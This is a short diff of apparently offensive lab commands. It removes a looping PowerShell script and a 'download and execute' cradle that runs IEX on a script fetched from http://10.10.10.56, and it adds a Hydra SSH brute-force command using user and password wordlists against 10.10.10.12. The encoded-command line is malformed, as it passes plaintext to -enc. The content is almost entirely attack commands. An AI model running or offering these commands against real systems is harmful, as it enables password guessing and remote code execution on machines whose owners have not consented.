@@ -1,9 +1,1 @@
-# High Frequency execution script
-while ($true)
-{
-    Get-Date
-    Start-Sleep -Seconds 10
-}
-
-# Encoded Command to download and execute a file
-powershell -enc IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.56/HighFrequencyEncCmd.ps1')
+hydra -L '/root/Wordlist/userlist.txt' -P '/root/Wordlist/pass.txt' 10.10.10.12 ssh -t 4
